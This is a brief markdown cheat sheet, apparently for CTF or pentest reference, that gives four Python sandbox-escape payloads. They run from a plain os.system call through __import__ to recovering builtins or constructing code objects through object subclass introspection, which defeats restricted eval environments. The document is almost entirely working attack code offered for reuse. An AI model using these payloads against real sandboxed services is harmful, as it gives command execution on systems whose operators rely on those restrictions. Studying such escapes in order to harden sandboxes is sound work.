# Python Sandbox

## 1) Direct Eval

```
os.system('clear')
```

## 2) No gloabals

```
__import__('os').system('clear')
```

## 3) No globals, no builtins

```
s = """
(lambda fc=(
    lambda n: [
        c for c in 
            ().__class__.__bases__[0].__subclasses__() 
            if c.__name__ == n
        ][0]
    ):
    fc("function")(
        fc("code")(
            0,0,0,0,"KABOOM",(),(),(),"","",0,""
        ),{}
    )()
)()
"""
```

## 4) Builtins removed, import does not work

```
classes = {}.__class__.__base__.__subclasses__()
b = classes[49]()._module.__builtins__
m = b['__import__']('os')
m.system("test")
```
